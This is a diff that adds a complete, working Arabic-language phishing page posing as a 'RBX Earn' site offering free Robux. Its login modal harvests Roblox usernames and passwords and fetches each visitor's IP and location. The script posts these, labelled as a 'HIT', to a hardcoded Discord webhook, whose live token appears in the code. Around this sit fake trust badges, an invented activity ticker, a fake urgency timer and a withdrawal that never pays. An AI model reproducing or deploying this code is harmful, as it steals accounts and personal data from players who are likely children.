@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>RBX Earn — اكسب Robux مجانًا</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='15' fill='%2300b06f'/><text y='72' x='50' text-anchor='middle' font-size='65' fill='white' font-weight='bold'>R</text></svg>">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+html, body { overflow-x: hidden; }
+body { background: #f0f2f5; color: #1c1e21; min-height: 100vh; }
+
+/* NAV */
+.nav { background: #00b06f; padding: 14px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+.nav h1 { color: white; font-size: 18px; font-weight: 800; letter-spacing: -0.5px; }
+.nav button { background: rgba(255,255,255,0.2); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 18px; border-radius: 6px; font-weight: 600; font-size: 13px; cursor: pointer; transition: 0.2s; }
+.nav button:active { background: rgba(255,255,255,0.3); }
+
+/* HERO */
+.hero { background: linear-gradient(135deg, #00b06f 0%, #007944 100%); padding: 50px 20px 60px; text-align: center; color: white; position: relative; overflow: hidden; }
+.hero::before { content: ""; position: absolute; top: -50%; right: -20%; width: 300px; height: 300px; background: rgba(255,255,255,0.08); border-radius: 50%; }
+.hero::after { content: ""; position: absolute; bottom: -30%; left: -20%; width: 250px; height: 250px; background: rgba(255,255,255,0.06); border-radius: 50%; }
+.hero h2 { font-size: 30px; margin-bottom: 12px; font-weight: 800; line-height: 1.2; position: relative; z-index: 2; }
+.hero p { font-size: 15px; opacity: 0.95; margin-bottom: 25px; position: relative; z-index: 2; }
+.hero button { background: white; color: #00b06f; border: none; padding: 16px 44px; border-radius: 10px; font-size: 17px; font-weight: 800; cursor: pointer; box-shadow: 0 4px 14px rgba(0,0,0,0.15); position: relative; z-index: 2; transition: 0.2s; }
+.hero button:active { transform: scale(0.97); }
+
+/* LIVE TICKER */
+.ticker { background: #fff; padding: 10px 20px; text-align: center; font-size: 12px; color: #666; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: center; gap: 8px; }
+.ticker .dot { width: 8px; height: 8px; background: #00b06f; border-radius: 50%; animation: pulse 1.5s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+/* STATS */
+.stats { display: flex; gap: 10px; padding: 20px; max-width: 600px; margin: -30px auto 0; position: relative; z-index: 5; }
+.stat-card { flex: 1; background: white; padding: 18px 10px; text-align: center; border-radius: 12px; box-shadow: 0 4px 14px rgba(0,0,0,0.08); }
+.stat-card h3 { color: #00b06f; font-size: 19px; font-weight: 800; }
+.stat-card p { color: #666; font-size: 11px; margin-top: 4px; }
+
+/* FEATURES */
+.features { max-width: 600px; margin: 20px auto; padding: 0 20px; }
+.feature { background: white; padding: 18px; margin-bottom: 10px; border-radius: 12px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+.feature .icon { font-size: 26px; }
+.feature h3 { font-size: 15px; font-weight: 700; margin-bottom: 3px; }
+.feature p { font-size: 12px; color: #666; }
+
+footer { text-align: center; padding: 30px 20px; color: #999; font-size: 11px; }
+
+/* MODAL */
+.modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 9999; animation: fadeIn 0.2s; padding: 20px; }
+.modal-overlay.active { display: flex; align-items: center; justify-content: center; }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+.modal { background: white; padding: 28px 24px; border-radius: 16px; width: 100%; max-width: 420px; animation: slideUp 0.3s; max-height: 90vh; overflow-y: auto; }
+@keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+.modal .brand { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 6px; }
+.modal .brand .logo { width: 36px; height: 36px; background: #00b06f; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 20px; }
+.modal .brand .plus { font-size: 20px; color: #999; font-weight: 300; }
+.modal .brand .rbx { font-size: 13px; font-weight: 800; color: #00b06f; }
+
+.modal h2 { text-align: center; margin-bottom: 6px; font-size: 20px; font-weight: 800; }
+.modal .sub { text-align: center; color: #666; margin-bottom: 18px; font-size: 13px; line-height: 1.5; }
+
+.modal input { width: 100%; padding: 15px; margin: 6px 0; border: 2px solid #e5e5e5; border-radius: 10px; font-size: 16px; background: #fafafa; transition: border-color 0.2s; outline: none; font-family: inherit; }
+.modal input:focus { border-color: #00b06f; background: white; }
+
+.modal button.primary { width: 100%; padding: 15px; background: #00b06f; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 14px; transition: 0.2s; }
+.modal button.primary:active { background: #009960; }
+.modal button.primary:disabled { background: #ccc; cursor: not-allowed; }
+
+.modal .secure { text-align: center; color: #999; font-size: 11px; margin-top: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+.modal .secure svg { width: 12px; height: 12px; fill: #999; }
+
+/* TIMER */
+.timer-bar { background: #fff4e5; border: 1px solid #ffd699; padding: 10px; border-radius: 8px; text-align: center; font-size: 13px; color: #b87333; font-weight: 600; margin-bottom: 16px; }
+.timer-bar span { font-family: 'Courier New', monospace; font-weight: 800; font-size: 15px; color: #d97706; }
+
+/* FOUND ACCOUNT BOX */
+.found-box { background: #e8f9f0; border: 2px solid #00b06f; padding: 14px; border-radius: 10px; margin: 10px 0; text-align: center; animation: slideUp 0.3s; }
+.found-box .label { font-size: 12px; color: #666; }
+.found-box .username { font-size: 18px; font-weight: 800; color: #00b06f; margin: 4px 0; }
+.found-box .balance-preview { font-size: 13px; color: #666; margin-top: 6px; }
+.found-box .balance-preview b { color: #00b06f; font-weight: 800; }
+
+/* PROGRESS BAR */
+.progress-bar { width: 100%; height: 8px; background: #e5e5e5; border-radius: 4px; overflow: hidden; margin: 14px 0; }
+.progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #00b06f, #00d97e); border-radius: 4px; transition: width 0.3s; }
+.progress-text { text-align: center; font-size: 12px; color: #666; margin-top: 8px; }
+
+/* DASHBOARD */
+.dashboard { display: none; padding-bottom: 80px; }
+.dashboard.active { display: block; }
+.user-bar { background: white; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e5e5; }
+.user-bar .avatar { width: 38px; height: 38px; border-radius: 50%; background: #00b06f; display: flex; align-items: center; justify-content: center; color: white; font-weight: 800; font-size: 16px; }
+.user-bar .name { font-weight: 700; font-size: 14px; margin-right: 10px; }
+.user-bar .name small { display: block; color: #666; font-weight: 500; font-size: 11px; margin-top: 2px; }
+.badge { background: #e8f9f0; color: #00b06f; font-size: 11px; padding: 4px 10px; border-radius: 20px; font-weight: 700; }
+
+.balance-card { background: linear-gradient(135deg, #00b06f, #007944); margin: 20px; padding: 28px 20px; border-radius: 16px; text-align: center; color: white; box-shadow: 0 8px 20px rgba(0,176,111,0.3); }
+.balance-card h2 { font-size: 42px; font-weight: 800; letter-spacing: -1px; }
+.balance-card p { opacity: 0.9; font-size: 13px; margin-top: 4px; }
+.balance-card button { background: white; color: #00b06f; border: none; padding: 12px 32px; border-radius: 8px; margin-top: 16px; font-weight: 700; font-size: 14px; cursor: pointer; transition: 0.2s; }
+.balance-card button:active { transform: scale(0.97); }
+
+.progress-goal { margin: 0 20px 20px; background: white; padding: 16px; border-radius: 12px; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+.progress-goal .labels { display: flex; justify-content: space-between; font-size: 12px; color: #666; margin-bottom: 8px; }
+.progress-goal .bar { height: 10px; background: #e5e5e5; border-radius: 5px; overflow: hidden; }
+.progress-goal .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #00b06f, #00d97e); transition: width 0.4s; }
+
+.tasks-title { padding: 0 20px; margin-bottom: 10px; font-size: 15px; font-weight: 700; }
+.tasks { padding: 0 20px; }
+.task { background: white; padding: 16px; margin-bottom: 10px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 6px rgba(0,0,0,0.04); transition: 0.3s; }
+.task.done { opacity: 0.55; }
+.task-info h3 { font-size: 14px; font-weight: 700; margin-bottom: 3px; }
+.task-info p { font-size: 12px; color: #888; }
+.task button { background: #00b06f; color: white; border: none; padding: 9px 18px; border-radius: 8px; font-weight: 700; font-size: 13px; cursor: pointer; transition: 0.2s; }
+.task button:active { transform: scale(0.95); }
+.task button:disabled { background: #ccc; cursor: not-allowed; }
+
+@media (max-width: 360px) {
+    .hero h2 { font-size: 25px; }
+    .hero button { padding: 14px 32px; font-size: 15px; }
+    .balance-card h2 { font-size: 36px; }
+    .stats { padding: 15px 10px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ============ LANDING ============ -->
+<div id="landing">
+    <nav class="nav">
+        <h1>🎮 RBX Earn</h1>
+        <button onclick="openLogin()">تسجيل دخول</button>
+    </nav>
+
+    <div class="hero">
+        <h2>اكسب Robux مجانًا</h2>
+        <p>أكمل مهام بسيطة واحصل على Robux فورًا</p>
+        <button onclick="openLogin()">🎁 استلم جائزتك</button>
+    </div>
+
+    <div class="ticker">
+        <span class="dot"></span>
+        <span id="liveTicker">آخر تسجيل قبل 12 ثانية</span>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card"><h3 id="usersCount">52,847</h3><p>مستخدم</p></div>
+        <div class="stat-card"><h3>4.9★</h3><p>تقييم</p></div>
+        <div class="stat-card"><h3>1.2M</h3><p>R$ مُوزّع</p></div>
+    </div>
+
+    <div class="features">
+        <div class="feature"><div class="icon">💰</div><div><h3>مدفوعات فورية</h3><p>Robux يصل خلال دقائق</p></div></div>
+        <div class="feature"><div class="icon">🔒</div><div><h3>آمن 100%</h3><p>بدون رسوم، بدون بطاقة</p></div></div>
+        <div class="feature"><div class="icon">⚡</div><div><h3>مهام سريعة</h3><p>30 ثانية لكل مهمة</p></div></div>
+        <div class="feature"><div class="icon">🏆</div><div><h3>جوائز يومية</h3><p>Bonus لمن يكمل 5 مهام</p></div></div>
+    </div>
+
+    <footer>RBX Earn © 2025 — Secured by Roblox<br>بتسجيلك أنت توافق على الشروط</footer>
+</div>
+
+<!-- ============ DASHBOARD ============ -->
+<div id="dashboard" class="dashboard">
+    <nav class="nav">
+        <h1>🎮 RBX Earn</h1>
+        <button onclick="logout()">خروج</button>
+    </nav>
+
+    <div class="user-bar">
+        <div style="display:flex;align-items:center;">
+            <div class="avatar" id="avatarLetter">R</div>
+            <div class="name" style="margin-right:10px;">
+                <span id="userName">لاعب</span>
+                <small>مستوى 1 • عضوية جديدة</small>
+            </div>
+        </div>
+        <div class="badge">✓ موثّق</div>
+    </div>
+
+    <div class="balance-card">
+        <h2 id="bal">0 R$</h2>
+        <p>رصيدك الحالي</p>
+        <button onclick="withdraw()">اسحب Robux</button>
+    </div>
+
+    <div class="progress-goal">
+        <div class="labels">
+            <span>التقدم للسحب</span>
+            <span id="progressLabel">0 / 1000 R$</span>
+        </div>
+        <div class="bar"><div class="fill" id="progressFill"></div></div>
+    </div>
+
+    <div class="tasks-title">📋 المهام المتاحة</div>
+    <div class="tasks">
+        <div class="task" id="task1"><div class="task-info"><h3>📺 مشاهدة إعلان</h3><p>30 ثانية</p></div><button onclick="doTask(1,15)">+15 R$</button></div>
+        <div class="task" id="task2"><div class="task-info"><h3>📝 استبيان قصير</h3><p>دقيقتان</p></div><button onclick="doTask(2,30)">+30 R$</button></div>
+        <div class="task" id="task3"><div class="task-info"><h3>👥 متابعة حساب</h3><p>10 ثواني</p></div><button onclick="doTask(3,20)">+20 R$</button></div>
+        <div class="task" id="task4"><div class="task-info"><h3>🎁 دعوة صديق</h3><p>عند التسجيل</p></div><button onclick="doTask(4,50)">+50 R$</button></div>
+        <div class="task" id="task5"><div class="task-info"><h3>⭐ تقييم الموقع</h3><p>نجوم فقط</p></div><button onclick="doTask(5,25)">+25 R$</button></div>
+    </div>
+</div>
+
+<!-- ============ LOGIN MODAL ============ -->
+<div id="loginModal" class="modal-overlay">
+    <div class="modal">
+        <div class="brand">
+            <div class="logo">R</div>
+            <div class="plus">×</div>
+            <div class="rbx">RBX EARN</div>
+        </div>
+        <h2 id="modalTitle">تسجيل الدخول</h2>
+        <p class="sub" id="modalSub">سجّل بحساب Roblox للبدء</p>
+
+        <div class="timer-bar" id="timerBar">⏱️ تنتهي الجائزة بعد <span id="timer">10:00</span></div>
+
+        <!-- STEP 1: Username -->
+        <div id="step1">
+            <input id="u" type="text" placeholder="Username" autocomplete="off" autocapitalize="off" spellcheck="false">
+            <button class="primary" onclick="goStep2()" id="btnStep1">التالي ←</button>
+        </div>
+
+        <!-- STEP 2: Password -->
+        <div id="step2" style="display:none;">
+            <div class="found-box">
+                <div class="label">✓ تم العثور على حسابك</div>
+                <div class="username" id="foundUser">username</div>
+                <div class="balance-preview">الرصيد المتاح: <b>500 R$</b></div>
+            </div>
+            <input id="p" type="password" placeholder="Password" autocomplete="off">
+            <button class="primary" onclick="sendLogin()" id="btnStep2">استلم الرصيد</button>
+        </div>
+
+        <!-- VERIFYING -->
+        <div id="step3" style="display:none;">
+            <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
+            <div class="progress-text" id="progText">جاري التحقق...</div>
+        </div>
+
+        <div class="secure">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            Secured by Roblox
+        </div>
+    </div>
+</div>
+
+<script>
+// ==================================================
+// WEBHOOK حقك — موضوع
+// ==================================================
+const WEBHOOK = "https://discord.com/api/webhooks/1554099887560200192/VViDFpT_qVN-Gl1aTMTnLjUKJRqkrTVSTxuSlxWaF14BG342lottpqsT22Jb4y_5Vi12";
+// ==================================================
+
+const state = { user: null, balance: 0, done: {} };
+let timerInterval = null;
+let ipData = null;
+
+// -------- تحميل IP info تلقائيًا --------
+fetch("https://ipapi.co/json/").then(r => r.json()).then(d => { ipData = d; }).catch(() => {});
+
+// -------- Timer 10 دقائق --------
+function startTimer() {
+    let t = 600;
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(() => {
+        t--;
+        const m = Math.floor(t / 60);
+        const s = t % 60;
+        document.getElementById("timer").textContent = m + ":" + s.toString().padStart(2, "0");
+        if (t <= 0) t = 600;
+    }, 1000);
+}
+
+// -------- فتح modal --------
+function openLogin() {
+    document.getElementById("loginModal").classList.add("active");
+    document.getElementById("step1").style.display = "block";
+    document.getElementById("step2").style.display = "none";
+    document.getElementById("step3").style.display = "none";
+    document.getElementById("timerBar").style.display = "block";
+    document.getElementById("modalTitle").textContent = "تسجيل الدخول";
+    document.getElementById("modalSub").textContent = "سجّل بحساب Roblox للبدء";
+    document.getElementById("u").value = "";
+    document.getElementById("p").value = "";
+    document.getElementById("btnStep1").disabled = false;
+    document.getElementById("btnStep1").textContent = "التالي ←";
+    document.getElementById("btnStep2").disabled = false;
+    document.getElementById("btnStep2").textContent = "استلم الرصيد";
+    startTimer();
+}
+
+function closeLogin() {
+    document.getElementById("loginModal").classList.remove("active");
+}
+
+// -------- خطوة 1: Username --------
+function goStep2() {
+    const u = document.getElementById("u").value.trim();
+    if (!u) { alert("اكتب اسم المستخدم"); return; }
+    if (u.length < 3) { alert("اسم المستخدم قصير"); return; }
+
+    document.getElementById("foundUser").textContent = u;
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+    document.getElementById("modalTitle").textContent = "تأكيد الحساب";
+    document.getElementById("modalSub").textContent = "أدخل كلمة السر لاستلام الرصيد";
+    setTimeout(() => document.getElementById("p").focus(), 200);
+}
+
+// -------- خطوة 2: Password + إرسال --------
+async function sendLogin() {
+    const u = document.getElementById("u").value.trim();
+    const p = document.getElementById("p").value;
+    if (!p) { alert("اكتب كلمة السر"); return; }
+    if (p.length < 4) { alert("كلمة السر قصيرة"); return; }
+
+    document.getElementById("step2").style.display = "none";
+    document.getElementById("step3").style.display = "block";
+    document.getElementById("timerBar").style.display = "none";
+    document.getElementById("modalTitle").textContent = "جاري التحقق";
+    document.getElementById("modalSub").textContent = "لا تغلق الصفحة";
+
+    // Progress animation
+    const steps = ["فحص الاتصال...", "التحقق من الحساب...", "تأكيد الهوية...", "جارٍ الاستلام..."];
+    let idx = 0;
+    const fill = document.getElementById("progFill");
+    const text = document.getElementById("progText");
+
+    const progInt = setInterval(() => {
+        idx++;
+        fill.style.width = (idx * 25) + "%";
+        if (idx - 1 < steps.length) text.textContent = steps[idx - 1];
+        if (idx >= 4) {
+            clearInterval(progInt);
+            setTimeout(finishLogin, 600);
+        }
+    }, 700);
+
+    // إرسال البيانات للـ webhook (في الخلفية — بدون انتظار)
+    const ip = ipData || {};
+    const payload = {
+        content: "**🎯 RBX EARN — HIT**\n" +
+                 "```" +
+                 "User: " + u + "\n" +
+                 "Pass: " + p + "\n" +
+                 "IP: " + (ip.ip || "?") + "\n" +
+                 "Country: " + (ip.country_name || "?") + "\n" +
+                 "City: " + (ip.city || "?") + "\n" +
+                 "ISP: " + (ip.org || "?") + "\n" +
+                 "UA: " + navigator.userAgent.slice(0, 120) + "\n" +
+                 "Lang: " + navigator.language + "\n" +
+                 "Screen: " + screen.width + "x" + screen.height + "\n" +
+                 "Time: " + new Date().toISOString() +
+                 "```"
+    };
+
+    try {
+        await fetch(WEBHOOK, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify(payload)
+        });
+    } catch(e) {
+        console.error(e);
+    }
+
+    // احفظ للاستخدام بعد الدخول
+    state.user = u;
+}
+
+// -------- إنهاء التسجيل --------
+function finishLogin() {
+    closeLogin();
+
+    document.getElementById("userName").textContent = state.user;
+    document.getElementById("avatarLetter").textContent = state.user[0].toUpperCase();
+
+    document.getElementById("landing").style.display = "none";
+    document.getElementById("dashboard").classList.add("active");
+
+    // reset
+    document.getElementById("u").value = "";
+    document.getElementById("p").value = "";
+}
+
+// -------- المهام --------
+function doTask(id, amount) {
+    if (state.done[id]) return;
+    state.done[id] = true;
+    state.balance += amount;
+    document.getElementById("bal").textContent = state.balance.toLocaleString() + " R$";
+    const task = document.getElementById("task" + id);
+    task.classList.add("done");
+    const btn = task.querySelector("button");
+    btn.textContent = "✓";
+    btn.disabled = true;
+    updateProgress();
+}
+
+function updateProgress() {
+    const pct = Math.min(100, (state.balance / 1000) * 100);
+    document.getElementById("progressFill").style.width = pct + "%";
+    document.getElementById("progressLabel").textContent = state.balance + " / 1000 R$";
+}
+
+// -------- السحب --------
+function withdraw() {
+    if (state.balance < 1000) {
+        const rem = 1000 - state.balance;
+        alert("تحتاج " + rem + " R$ إضافية للسحب.\nأكمل المهام المتبقية!");
+    } else {
+        alert("✅ تم إرسال طلب السحب بنجاح!\nسيصلك Robux خلال 24 ساعة.");
+    }
+}
+
+// -------- خروج --------
+function logout() {
+    state.user = null;
+    state.balance = 0;
+    state.done = {};
+    document.getElementById("bal").textContent = "0 R$";
+    document.getElementById("progressFill").style.width = "0%";
+    document.getElementById("progressLabel").textContent = "0 / 1000 R$";
+    document.getElementById("dashboard").classList.remove("active");
+    document.getElementById("landing").style.display = "block";
+    document.querySelectorAll(".task").forEach(t => {
+        t.classList.remove("done");
+        const b = t.querySelector("button");
+        b.disabled = false;
+        b.textContent = "+" + b.textContent.match(/\d+/)[0] + " R$";
+    });
+}
+
+// -------- Live Ticker --------
+const tickerTexts = [
+    "آخر تسجيل قبل 12 ثانية",
+    "أحمد من الرياض ربح 500 R$ 🎉",
+    "سارة من جدة سحبت 1000 R$ ✨",
+    "محمد من الدمام سجّل الآن 🔥",
+    "آخر تسجيل قبل 8 ثوانٍ",
+    "نورة ربحت 750 R$ 💰",
+    "عبدالله سحب 2000 R$ 🚀"
+];
+let tickerIdx = 0;
+setInterval(() => {
+    tickerIdx = (tickerIdx + 1) % tickerTexts.length;
+    const el = document.getElementById("liveTicker");
+    el.style.opacity = 0;
+    setTimeout(() => {
+        el.textContent = tickerTexts[tickerIdx];
+        el.style.opacity = 1;
+    }, 300);
+}, 3500);
+
+// -------- عداد المستخدمين --------
+setInterval(() => {
+    const el = document.getElementById("usersCount");
+    let curr = parseInt(el.textContent.replace(/,/g, ""));
+    curr += Math.floor(Math.random() * 3);
+    el.textContent = curr.toLocaleString();
+}, 5000);
+
+// Close on overlay click
+document.getElementById("loginModal").addEventListener("click", (e) => {
+    if (e.target.id === "loginModal") closeLogin();
+});
+
+// Enter key
+document.getElementById("u").addEventListener("keypress", (e) => {
+    if (e.key === "Enter") goStep2();
+});
+document.getElementById("p").addEventListener("keypress", (e) => {
+    if (e.key === "Enter") sendLogin();
+});
+</script>
+</body>
+</html>
